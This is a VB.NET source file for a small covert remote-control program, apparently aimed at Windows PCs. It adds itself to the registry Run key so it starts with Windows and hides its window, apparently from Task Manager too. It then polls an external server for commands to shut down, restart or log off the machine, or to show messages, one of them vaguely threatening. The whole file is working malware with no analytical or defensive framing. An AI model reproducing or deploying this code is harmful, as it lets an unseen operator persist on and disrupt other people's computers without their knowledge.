Imports Microsoft.Win32

Public Class home
    Dim sv As String

    Private Sub home_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RunAtStartup(Application.ProductName, Application.ExecutablePath)
        '   Me.Visible = False

        ' RemoveValue(Application.ProductName)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If sv = "yes" Then
                Dim gets As String = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/db.txt")
                If gets = "msg" Then
                    Dim rest As String = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/kills.php")

                    chao()
                ElseIf gets = "offpcmsg" Then
                    Dim rest2 As String = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/kills.php")

                    offpcmsg()
                ElseIf gets = "outpc" Then
                    Dim rest2 As String = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/kills.php")

                    outpc()

                ElseIf gets = "rppc" Then
                    Dim rest2 As String = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/kills.php")

                    repc()

                ElseIf gets = "logpc" Then
                    Dim rest2 As String = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/kills.php")

                    logoff()
                End If
            Else

            End If
        Catch

        End Try
    End Sub


    Sub chao()

        MsgBox("Xin chào!", vbInformation, "Messger")

    End Sub

    Sub offpcmsg()

        MsgBox("Có người đang nhắc nhỡ bạn nghỉ ngơi và tắt máy tính. Hãy nghỉ ngơi trước khi có chuyện không vui sắp xảy ra!", vbInformation, "Messger")

    End Sub
    Sub outpc()
        System.Diagnostics.Process.Start("shutdown", "-s -t 00")
    End Sub
    Sub repc()
        System.Diagnostics.Process.Start("shutdown", "-r -t 00")
    End Sub
    Sub logoff()
        System.Diagnostics.Process.Start("shutdown", "-l -t 00")
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            sv = New System.Net.WebClient().DownloadString("http://cpm.luutru360.com/chks.php")
        Catch

        End Try

    End Sub
    'setvalue
    Public Sub RunAtStartup(ByVal ApplicationName As String, ByVal ApplicationPath As String)
        Dim CU As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        With CU
            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)

            .SetValue(ApplicationName, ApplicationPath)

        End With
    End Sub
    'remove value
    Public Sub RemoveValue(ByVal ApplicationName As String)
        Dim CU As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        With CU
            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)

            .DeleteValue(ApplicationName, False)

        End With
    End Sub

    Private Sub hdt_Tick(sender As Object, e As EventArgs) Handles hdt.Tick
        Try
            TMListViewDelete.Running = True
            Me.Visible = False
            hdt.Enabled = False
        Catch

        End Try
    End Sub

    Private Sub home_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        Try
            If e.Alt And e.KeyCode = Keys.H Then
                MsgBox("Hi")
            End If
            If e.Alt And e.KeyCode = Keys.E Then
                End
            End If
        Catch

        End Try
    End Sub

End Class
